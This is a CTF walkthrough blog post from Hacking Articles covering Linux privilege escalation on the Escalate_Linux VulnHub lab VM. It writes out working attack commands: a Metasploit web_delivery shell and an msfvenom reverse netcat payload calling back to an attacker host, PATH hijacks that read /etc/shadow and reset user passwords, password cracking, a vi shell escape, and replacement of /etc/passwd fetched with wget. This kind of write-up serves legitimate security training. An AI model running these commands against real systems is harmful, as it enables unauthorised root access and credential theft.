@@ -1,0 +1,168 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Escalate_Linux: Vulnhub Walkthrough (Part 1)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/escalate_linux-vulnhub-walkthrough-part-1/" rel="bookmark"><time class="entry-date published" datetime="2019-07-11T16:55:17+00:00">July 11, 2019</time><time class="updated" datetime="2025-06-10T20:11:35+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Escalate_Linux is an intentionally developed Linux vulnerable virtual machine. The main focus of this machine is to learn Linux Post Exploitation (Privilege Escalation) Techniques. The credit for making this VM machine goes to “Manish Gupta” and it is a boot2root challenge where the creator of this machine wants us to root the machine through twelve different ways. You can download the machine following this link: <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/escalate_linux-1,323/">https://www.vulnhub.com/entry/escalate_linux-1,323/</a></span></span></p>
+<p><span style="color: #000000;"><em>NOTE: In this article, we have exploited the machine with six different methods.</em></span></p>
+<p><span style="color: #000000;"><strong>Security Level</strong>: Beginner-Intermediate</span></p>
+<h3><span style="color: #800000;"><strong>Penetrating Methodology:</strong></span></h3>
+<p><span style="color: #000000;"><strong>Scanning</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Netdiscover</span></li>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Web Directory Search </span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Metasploit shell upload</span></li>
+<li><span style="color: #000000;">LinEnum.sh</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Method 1: Get root shell by exploiting suid rights of the shell file</span></li>
+<li><span style="color: #000000;">Method 2: Get a root shell by cracking the root password</span></li>
+<li><span style="color: #000000;">Method 3: Get root shell by exploiting sudo rights of user1</span></li>
+<li><span style="color: #000000;">Method 4: Get root shell by exploiting crontab</span></li>
+<li><span style="color: #000000;">Method 5: Exploiting Sudo rights of vi editor</span></li>
+<li><span style="color: #000000;">Method 6: Exploiting writable permission of /etc/passwd file</span></li>
+</ul>
+<h3><span style="color: #800000;">Walkthrough:</span></h3>
+<h3><span style="color: #000000;"><strong>Scanning</strong><strong>:</strong></span></h3>
+<p><span style="color: #000000;">Let’s start off by scanning the network using Netdiscover tool and identify the host IP address. We can identify our host IP address as 192.168.0.17.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-hMtvtNvnQgg/XSdbD1yMWfI/AAAAAAAAfIc/XDBVJDYx6D04iNiYUbTWzNFjLCulq7hPwCLcBGAs/s1600/1.png"/></p>
+<p><span style="color: #000000;">Now let’s scan the services and ports of target machine with nmap</span></p>
+<pre class="lang:default decode:true">nmap -A 192.168.0.17</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-aFWbd-WI7Y4/XSdbHrg2JZI/AAAAAAAAfJE/ztqYz2yqscgAZXewuFyGHNqZlCqtl_O5gCLcBGAs/s1600/2.png"/></strong></span></p>
+<h3><span style="color: #800000;"><strong>Enumeration:</strong></span></h3>
+<p><span style="color: #000000;">As we can see port 80 is open, so we tried to open the IP address in our browser and got nothing but the default Apache webpage.</span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-hd0Dbtrzkko/XSdbLFqX7bI/AAAAAAAAfJs/7JuS71NHXlQFkiqhNRXLcza8QGUcOKBYQCLcBGAs/s1600/3.png"/></strong></span></p>
+<p><span style="color: #000000;">So we used <strong>dirb</strong> with .php filter for directory enumeration.</span></p>
+<pre class="lang:default decode:true">dirb http://192.168.0.17/ –X .php</pre>
+<p><span style="color: #000000;">After brute-forcing with dirb, we found a URL named http://192.168.0.17<strong>/shell.php</strong></span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-IloO-V0DVNw/XSdbL_vFzCI/AAAAAAAAfJ4/23unPNPY4WMJ4g6mmsIhugPjPDTQnIYYQCLcBGAs/s1600/4.png"/></p>
+<p><span style="color: #000000;">Now we opened the URL in our browser and found that it accepts <strong>cmd</strong> as get parameter.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-IsjuG7svBvU/XSdbMfhI4AI/AAAAAAAAfJ8/lB1t3w0jAXMwPV3oN9cQwecrUfOb08MwgCLcBGAs/s1600/5.png"/></p>
+<p><span style="color: #000000;">So, we passed the <strong>id</strong> command in the URL and found the results are reflected in the response.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-1FH0Qk0CmiA/XSdbM3TVabI/AAAAAAAAfKA/kDphbThWuTIZaRSMKq32swrLWcXDJZR6QCLcBGAs/s1600/6.png"/></p>
+<h3><span style="color: #800000;"><strong>Exploiting</strong></span></h3>
+<p><span style="color: #000000;">Since the target machine is vulnerable to command injection, we created a web delivery shell using Metasploit.</span></p>
+<pre class="lang:default decode:true">use exploit/multi/script/web_delivery
+set srvhost 192.168.0.12
+set lhost 192.168.0.12
+exploit</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-ci8e-xoQxs8/XSdbNNbMwgI/AAAAAAAAfKE/bYX9kUgZh200Tu4TOwgibJmDxOvt5TNjgCLcBGAs/s1600/7.png"/></p>
+<p><span style="color: #000000;">The target host was not able to run the script directly, so we used URL encoding.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-CWE_RYnN1D8/XSdbNVEQBoI/AAAAAAAAfKI/gIWt6_oQRNAGwycWbzwl4ucR-clCwq0DgCLcBGAs/s1600/8.png"/></p>
+<p><span style="color: #000000;">After encoding the script, we were successfully able to run it on the target machine and get the meterpreter session. </span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-SJNHJjCP6bY/XSdbNZJlnjI/AAAAAAAAfKM/Hlxf0lyphJUv2guKgVMeigcxaP24E9tMgCLcBGAs/s1600/9.png"/></p>
+<p><span style="color: #000000;">We got the bash shell of User6 after using python one-liner shell command.</span></p>
+<p><span style="color: #000000;">To further enumerate the target host, we uploaded <strong>LinEnum</strong> tool on the target host.</span></p>
+<pre class="lang:default decode:true">upload /root/LinEnum.sh .
+shell
+python -c 'import pty;pty.spawn("/bin/bash")'
+chmod 777 LinEnum.sh
+./LinEnum.sh</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-dWHEx15-Qjk/XSdbEQK1FSI/AAAAAAAAfIk/RN2tfx7ARt0OZ31Rlbuc_4_VjJ1XvQGTACLcBGAs/s1600/10.png"/></p>
+<p><span style="color: #000000;">From the results of LinEnum scan, we found that the target host has<strong> eight users</strong> namely user1, user2 up to user8.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-jg-B7sZL0cQ/XSdbERfjn_I/AAAAAAAAfIg/vqMSd54COJUAujMIU7OZXxyNYbd3wn9mgCLcBGAs/s1600/11.png"/></p>
+<p><span style="color: #000000;">We also found that in crontab, a file named <strong>autoscript.sh</strong> is being run every <strong>5 minutes</strong> with root privileges.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-mTt8B61q70U/XSdbE1Ve4fI/AAAAAAAAfIo/Ez-g0QEHqoYwTC-uwxv-dFZNTrO-vTz1QCLcBGAs/s1600/12.png"/></p>
+<p><span style="color: #000000;">From the same LinEnum scan, we came to know that <strong>/etc/passwd </strong>is writable for users also. Also, we found that we can run <strong>shell </strong>and<strong> script files</strong> with root privileges because SUID bit is enabled on it.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-HDoeR_FB0IE/XSdbFZcsKwI/AAAAAAAAfIs/UBD-AIP7O7ggetnNYunciL7mk_fIBLtDwCLcBGAs/s1600/14.png"/></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation:</strong></span></h3>
+<p><span style="color: #000000;">As mentioned above there are multiple ways to do the privilege escalation of this machine.</span></p>
+<p><span style="color: #000000;">We will try to do as many methods as possible.</span></p>
+<h3><span style="color: #800000;"><strong><u>Method 1: Get root shell by exploiting SUID rights of the shell file</u></strong></span></h3>
+<p><span style="color: #000000;">Using the find command we can confirm that the <strong>shell</strong> file located in the home directory of <strong>user3</strong> can be executed with root privileges.</span></p>
+<p><span style="color: #000000;">We tried to execute the same file and got the root shell.</span></p>
+<pre class="lang:default decode:true">find / -perm -u=s -type f 2&gt;/dev/null
+cd /home/user3
+./shell</pre>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-pJUJN-fVRgg/XSdbF_fXnXI/AAAAAAAAfIw/iZx6BQFfY4EO6PiN_Bxc9k75qsyaYxBNQCLcBGAs/s1600/15.png"/></strong></span></p>
+<h3><span style="color: #800000;"><strong><u>Method 2: Get a root shell by cracking the root password</u></strong></span></h3>
+<p><span style="color: #000000;">From the above screenshot, we know that the <strong>script</strong> file located in the <strong>user5</strong> home directory can be executed with root privileges. Using the Path variable exploitation methodology we can access the <strong>/etc/shadow</strong> file.</span></p>
+<p><span style="color: #000000;">To know more about path variable privilege escalation use this link: <a style="color: #000000;" href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</a></span></p>
+<pre class="lang:default decode:true ">cd /tmp
+echo "cat /etc/shadow" &gt; ps
+chmod 777 ps
+export PATH=/tmp:$PATH
+cd /home/user5
+./script</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-KGjtFvVjINw/XSdbF74Y-4I/AAAAAAAAfI0/VtEZ-8xSFjseC3miTp1g3Cmci94AaSlYQCLcBGAs/s1600/16.png"/></p>
+<p>on executing ./script, we have fetched the content of shadow’s file as shown in the below image.</p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-VbfWMQb83wM/XSdbGkeNVtI/AAAAAAAAfI4/x70ghA0o6Bg_cR07zZsoOq9fvMi0UMcLQCLcBGAs/s1600/17.png"/></p>
+<p><span style="color: #000000;">We copied the hashed password of root user in the hash file and used John The Ripper tool to crack the password. We got the password of the root as <strong>12345</strong> and then using the <strong>su </strong>command we were able to access as root.</span></p>
+<pre class="lang:default decode:true">john hash
+su root</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-gBoGyEg7Rew/XSdbHFg1zRI/AAAAAAAAfI8/CMnLrrr9i94wxkuqsD6FNITsV4WrLW8ugCLcBGAs/s1600/18.png"/></p>
+<h3><span style="color: #800000;"><strong><u>Method 3: Get root shell by exploiting SUDO rights of user1</u></strong></span></h3>
+<p><span style="color: #000000;">We already know by now that script file can be executed with root privileges.</span></p>
+<p><span style="color: #000000;">Using the same script file we can change the password of all the users with the help of Path variable methodology.</span></p>
+<p><span style="color: #000000;">Here we used <strong>echo</strong> and <strong>chpasswd</strong> command to replace the existing password with our new password <strong>12345</strong>. And then switched to the user1 account using <strong>su </strong>command. After checking the sudoer’s list for user1 we came to know that this user can run all commands as sudo.</span></p>
+<p><span style="color: #000000;">So we ran the command <strong>sudo su</strong> and got the root access.</span></p>
+<pre class="lang:default decode:true">echo 'echo "user1:12345" | chpasswd' &gt; ls
+chmod 777 ls
+export PATH=/tmp:$PATH
+cd /home/user5
+./script
+su user1
+sudo –l
+sudo su</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-_6RiyWPPj0c/XSdbHGbMJFI/AAAAAAAAfJA/JLOf348lRxY6fkDn_ZP7TcAkJp5bvpengCLcBGAs/s1600/19.png"/></p>
+<h3><span style="color: #800000;"><strong><u>Method 4: Get root shell by exploiting crontab</u></strong></span></h3>
+<p><span style="color: #000000;">In the previous screenshot, we saw there is a task scheduled after every <strong>5 minutes</strong> for <strong>user4</strong> in the crontab by the name <strong>autoscript.sh</strong>. We changed the password of user4 the same way as we did for user1 and then switched to user4 with the new password <strong>12345</strong>. There we can see a file <strong>autoscript.sh </strong>in the Desktop folder.</span></p>
+<pre class="lang:default decode:true">su user4
+ls -la</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-RPsrB6ros_Y/XSdbIdvUsiI/AAAAAAAAfJI/Zf_XFzZV7ykP0G2HNGpSyeFGRxIUn6mRACLcBGAs/s1600/20.png"/></p>
+<p><span style="color: #000000;">So what we did is we created a payload using msfvenom and then copied the code into autoscript.sh file using echo.</span></p>
+<pre class="lang:default decode:true">msfvenom –p cmd/unix/reverse_netcat lhost=192.168.0.12 lport=8888 R</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-5rYlOX6SWtc/XSdbIhlltHI/AAAAAAAAfJM/K9V_kptsfGA9LgrIOQXPt51l2iEHfb4LwCLcBGAs/s1600/21.png"/></p>
+<pre class="lang:default decode:true">echo "code" &gt; autoscript.sh</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-kR-DgaQPJbY/XSdbI-vi1OI/AAAAAAAAfJQ/ZgW9EBxCHvIG6dzVf-IRdkiDD6QqjXE_QCLcBGAs/s1600/22.png"/></p>
+<p><span style="color: #000000;">After copying the code into autoscript.sh file we executed the file and started the netcat listener on our kali machine and waited for the shell.</span></p>
+<p><span style="color: #000000;">Yes we got the <strong>root </strong>shell as the autoscript.sh is executing as root in the crontab.</span></p>
+<pre class="lang:default decode:true">nc –lvp 8888
+id</pre>
+<p><span style="color: #000000;"><strong><u><img decoding="async" src="https://1.bp.blogspot.com/-W6bRrnA_9yI/XSdbJVpVbuI/AAAAAAAAfJY/xH5Ef9sKuckvf5rfgB1OUi_llRCq3ZKhgCLcBGAs/s1600/23.png"/></u></strong></span></p>
+<h3><span style="color: #800000;"><strong><u>Method 5: Exploiting SUDO rights of vi editor</u></strong></span></h3>
+<p><span style="color: #000000;">We changed the password of all the users to <strong>12345 </strong>using the same methodology as above and switched between users to check for more exploits. We found that <strong>user8</strong> has a sudo permission for vi editors.</span></p>
+<pre class="lang:default decode:true">su user8
+sudo -l</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-rvk4fQiNgOI/XSdbJDV-nuI/AAAAAAAAfJU/q-c2sGFQ0xQhyeisIRMLizTBLZ_nIx4NQCLcBGAs/s1600/24.png"/></p>
+<p><span style="color: #000000;">Open the <strong>vi</strong> editor with <strong>sudo</strong> and insert <strong>sh</strong> command as shown in the screenshot below, exit the editor and hurray we got the <strong>root shell.</strong></span></p>
+<pre class="lang:default decode:true">:!sh
+ids</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-NZ9B_gcm3c4/XSdbJ6p3R1I/AAAAAAAAfJc/6rbDLzshGO0alB_sZkNnzy6ijZe2AFJKwCLcBGAs/s1600/25.png"/></p>
+<p>And again we will obtain the root shell as shown below in the image.</p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-tDtDEek4NpM/XSdbKGeNgkI/AAAAAAAAfJg/Otcwz232magf64m5f5PloF9JxsFM03_zgCLcBGAs/s1600/26.png"/></p>
+<h3><span style="color: #800000;"><strong><u>Method 6: Exploiting writable permission of /etc/passwd file</u></strong></span></h3>
+<p><span style="color: #000000;">Continuing with the enumeration of users, we found that <strong>user7 </strong>is a member of the <strong>root</strong> group with <strong>gid 0.</strong></span></p>
+<p><span style="color: #000000;">And we already know from the <strong>LinEnum</strong> scan that <strong>/etc/passwd</strong> file is writable for the user. So from this observation, we concluded that <strong>user7 </strong>can edit the /etc/passwd file.</span></p>
+<pre class="lang:default decode:true">tail /etc/passwd
+su user7
+id</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-vnxnnjXfAKY/XSdbKQUKY_I/AAAAAAAAfJk/cMP1vg99ROIUlgOe6HmirYYlMGrgnkquACLcBGAs/s1600/27.png"/></p>
+<p><span style="color: #000000;">So we copied the contents of /etc/passwd file in our kali machine and created a new user named <strong>raj </strong>with <strong>root privileges </strong>for which we generated a password <strong>pass123 </strong>using <strong>openssl.</strong></span></p>
+<pre class="lang:default decode:true">openssl passwd -1 -salt ignite pass123</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-F9N6Vx0U5cw/XSdbKxIl8QI/AAAAAAAAfJo/m_uZMZVdCrIs8P_lNzzS3pnuabzJgJcwACLcBGAs/s1600/29.png"/></p>
+<p>As you can observe we have created a new entry inside /etc/passwd for user raj with root privilege.</p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-jRaUh9m58KA/XSdbLbZHA4I/AAAAAAAAfJw/UavthHe2h4cAJkvYr4Rf6J4ksK5H0_HWwCLcBGAs/s1600/30.png"/></p>
+<p><span style="color: #000000;">On the target machine, we downloaded the edited <strong>passwd</strong> file in the <strong>/etc</strong> folder using <strong>wge</strong>t command.</span></p>
+<p><span style="color: #000000;">Then we tried to switch to our newly created user <strong>raj </strong>and YES yet again we proudly got the <strong>root shell </strong>of the machine.</span></p>
+<pre class="lang:default decode:true">cd /etc
+wget –O passwd http://192.168.0.12:8000/passwd
+su raj
+id</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-NzPVf0MZN9M/XSdbLhQOUKI/AAAAAAAAfJ0/VExR4_aEahoRAK4bR9N5MnG1Z3bEmNT-wCLcBGAs/s1600/31.png"/></p>
+<p><span style="color: #000000;"><strong>Conclusion:</strong> So in this part-1 of Escalate_Linux we did the privilege escalation by six different methodologies. In the part-2 we will try to exploit the machine by some different methods. So keep visiting Hacking Articles for next part.</span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Auqib Wani is a Certified Ethical Hacker, Penetration Tester and a Tech Enthusiast with more than 5 years of experience in the field of Network &amp; Cyber Security. Contact</span> <strong><a href="https://www.linkedin.com/in/auqib-wani-14210a71/">Here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
